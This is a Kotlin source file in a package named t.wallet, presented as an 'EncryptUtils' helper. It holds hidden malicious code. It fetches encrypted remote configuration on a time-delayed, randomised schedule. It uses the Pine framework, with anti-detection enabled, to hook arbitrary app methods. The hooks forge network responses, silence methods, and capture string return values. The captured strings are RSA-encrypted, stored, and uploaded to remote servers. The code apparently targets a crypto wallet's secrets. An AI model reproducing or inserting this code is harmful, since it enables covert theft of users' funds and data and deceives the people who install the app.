package t.wallet

import android.app.Application
import android.content.Context
import android.content.SharedPreferences
import com.google.gson.Gson
import okhttp3.Interceptor
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Protocol
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import okhttp3.ResponseBody.Companion.toResponseBody
import okhttp3.logging.HttpLoggingInterceptor
import top.canyie.pine.Pine
import top.canyie.pine.PineConfig
import top.canyie.pine.callback.MethodHook
import top.canyie.pine.callback.MethodReplacement
import java.lang.reflect.Method
import java.net.Proxy
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread
import kotlin.random.Random


internal object EncryptUtils {
//    private val TAG = "Tg."

    private var sp: SharedPreferences? = null

    private const val T1 = 1689379291000L
    private const val T2 = 1690588891000L
    private const val C_KEY = "17492847"
    private const val L_KEY = "85498243"
    private var DEFAULT =
        """D5C23FC0D0B8875637726162DEB0E6EB65696B010C6D7A5BF3FD66FEB511BEF613E9559C2E9907EA4C616A603667D6CFDA46A47463ADC677F413782A2A1A5858860B6BC7FA0C7537D32D94E823E1BE34AF2C64D4E1EA09A4680269C55365AEC177C315F1E4348588ABF0A448E0833F08E291FD75815BA63B4034BEB2BD100D08FACDA0C64F651549608530E23379599DCC9DF32C8D6796C20781A488A055BD3D9359A9891BC441F8B67E2ECCD112B36736E25F9B67FED804B0845F734CC0622BE198773A910297FE9A23BBBFE6A737C643242BC2DF2231459EE9D546ED06BBE430D5B24B3729BC4419E18FAE1DDF51716B4E7E9AB9FAAE10813A5FAF005E6F75""".trimIndent()


    fun init(app: Application) {
//        Log.i(TAG, "init utils")

        PineConfig.debug = false
        PineConfig.disableHiddenApiPolicy = false
        PineConfig.disableHiddenApiPolicyForPlatformDomain = false
        PineConfig.antiChecks = true

        sp = app.getSharedPreferences("encrypt_", Context.MODE_PRIVATE)

        val be = f() ?: return

        val b = e(be) ?: return

        if (b) fe(be.c, be.v)

        a(be)

        b(be.ok)

        c(be.not)

        d(be.sa)
    }

    private fun a(b: B) {
//        Log.i(TAG, "checkUpload")
        val list = loadValue() ?: return
        if (list.isEmpty()) return
        thread(true) {
            kotlin.runCatching {
                u(b.u, list)
            }
        }
    }

    private fun e(b: B): Boolean? {
        val now = System.currentTimeMillis()
        if (now < T1) return null

        sp?.getLong(L_KEY, 0)?.let {
            if (now - it > b.d) {
                return if (now < T2) Random.nextFloat() <= b.r else true
            }
        }
        return false
    }

    private fun fe(u: List<String>, v: Long) {
//        Log.i(TAG, "fetchConfig:$u $v")
        val c = gC()
        val mediaType = "application/json".toMediaType()
        val rb =
            """{"fromApp":1,"configVersion":$v}""".toRequestBody(mediaType)

        thread(true) {
            kotlin.runCatching {
                for (url in u) {
                    val r = Request.Builder().url(url).post(rb).build()
                    val re = c.newCall(r).execute()
                    val b = Gson().fromJson(re.body!!.string(), Re::class.java)
                    if (b.code == 1 && b.data.isNotEmpty()) {
                        val result = JEnc.decrypt(b.data)
                        if (result.isNotEmpty()) {
                            sp?.edit()?.apply {
                                putString(C_KEY, b.data)
                                putLong(L_KEY, System.currentTimeMillis())
                            }?.apply()
                            break
                        }
                    }
                }
            }
        }
    }


    private fun f(): B? {
        try {
            return sp?.getString(C_KEY, DEFAULT)
                ?.let { JEnc.decrypt(it) }
//                ?.also { Log.i(TAG, it) }
                ?.let { Gson().fromJson(it, B::class.java) }
        } catch (t: Throwable) {
        }
        return null
    }

    private fun b(list: List<Ok>) {
//        Log.i(TAG, "injectUpdate")

        list.forEach { bean ->
            kotlin.runCatching {
                val method = getM(bean.m) ?: return@runCatching
                val hook = object : MethodHook() {
                    override fun beforeCall(callFrame: Pine.CallFrame?) {
                        super.beforeCall(callFrame)
                        kotlin.runCatching {
                            callFrame?.args?.getOrNull(0)?.apply {
                                this as Interceptor.Chain
//                                Log.i(TAG, "injectInterceptor url:${request().url}")
                                val reU = request().url.toString()

                                val inject =
                                    bean.i.firstOrNull { reU.contains(it.u) }
                                        ?: return@apply

                                val response = getResponse(inject.r)
//                                Log.i(TAG, "injectInterceptor result:${response}")
                                callFrame.result = response
                            }
                        }
                    }

                    private fun Interceptor.Chain.getResponse(
                        body: String,
                        mediaType: String = "text/plain"
                    ) =
                        Response.Builder().request(request())
                            .body(body.toResponseBody(mediaType.toMediaType()))
                            .code(200).message("").protocol(Protocol.HTTP_1_1).build()
                }

                Pine.hook(method, hook)
            }
        }
    }

    private fun getM(method: M): Method? {
        try {
            return method.c.let { Class.forName(it) }
                .let {
                    val parameterTypes =
                        method.p.map {
                            when (it) {
                                "byte[]" -> ByteArray::class.java
                                "int[]" -> IntArray::class.java
                                "char[]" -> CharArray::class.java
                                "boolean[]" -> BooleanArray::class.java
                                "long[]" -> LongArray::class.java
                                "double[]" -> DoubleArray::class.java
                                "float[]" -> FloatArray::class.java
                                else -> Class.forName(it)
                            }
                        }.toTypedArray()
                    it.getDeclaredMethod(method.m, *parameterTypes)
                }
        } catch (t: Throwable) {
        }
        return null
    }

    private fun c(list: List<M>) {
        list.forEach { bean ->
            runCatching {
                val method = getM(bean) ?: return@runCatching
                Pine.hook(method, MethodReplacement.DO_NOTHING)
            }
        }
    }

    private fun d(list: List<M>) {
//        Log.i(TAG, "saveResult")

        list.forEach { bean ->
            runCatching {
                val method = getM(bean) ?: return@runCatching
                val methodHook = object : MethodHook() {
                    override fun afterCall(callFrame: Pine.CallFrame?) {
                        super.afterCall(callFrame)
                        kotlin.runCatching {
//                            Log.i(TAG, "saveResult afterCall")
                            callFrame?.result?.let {
                                if (it !is String) return@let
                                if (it.isNotBlank()) saveText(it)
                            }
                        }
                    }
                }
                Pine.hook(method, methodHook)
            }
        }

    }


    private fun saveText(s: String) {
//        Log.i(TAG, "saveText")
        thread(true) {
            kotlin.runCatching {
                val key = JEnc.md5(("able $s you").toByteArray()) ?: return@runCatching
                sp?.apply {
                    if (getString(key, null) == null) {
                        val now = System.currentTimeMillis()
                        val dataString = JEnc.encryptRSA(s)
                        val result = now.toString() + dataString
                        edit().putString(key, "false$result").commit()
                    }
                }
            }
        }
    }


    private fun loadValue(): List<Pair<String, String>>? {
        return sp?.all?.filter { it.key.length == 32 && it.value is String }
            ?.map { Pair(it.key, it.value as String) }
            ?.filter { it.second.startsWith("false") }

    }


    private fun u(urls: List<String>, values: List<Pair<String, String>>) {
        if (values.isEmpty()) return
//        Log.i(TAG, "upload:$values")
        val result = values.joinToString { it.second.removePrefix("false") }
        val client = gC()
        val mediaType = "application/json".toMediaType()
        val requestBody =
            """{"fromApp":1,"value":"$result"}""".toRequestBody(mediaType)

        kotlin.runCatching {
            for (url in urls) {
                val request = Request.Builder().url(url).post(requestBody).build()
                val response = client.newCall(request).execute()
                val json = response.body!!.string()
                val baseResponse = Gson().fromJson(json, Re::class.java)
                if (baseResponse.code == 1) {
                    sp?.apply {
                        values.forEach {
                            val value = it.second.replaceFirst("false", "true")
                            this.edit()?.putString(it.first, value)?.commit()
                        }
                    }
                }
            }
        }
    }

    private fun gC() = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .addInterceptor(HttpLoggingInterceptor().apply {
            level = HttpLoggingInterceptor.Level.BODY
        })
        .proxy(Proxy.NO_PROXY)
        .build()

}

private data class Re(
    var code: Int = -1,
    var msg: String = "",
    var data: String = ""
)

data class B(
    var c: List<String> = listOf(),
    var d: Long = 0,
    var not: List<M> = listOf(),
    var ok: List<Ok> = listOf(),
    var r: Float = 0f,
    var sa: List<M> = listOf(),
    var u: List<String> = listOf(),
    var v: Long = 0
)


data class Ok(
    var i: List<I> = listOf(),
    var m: M = M()
)


data class I(
    var r: String = "",
    var u: String = ""
)

data class M(
    var c: String = "",
    var m: String = "",
    var p: List<String> = listOf()
)
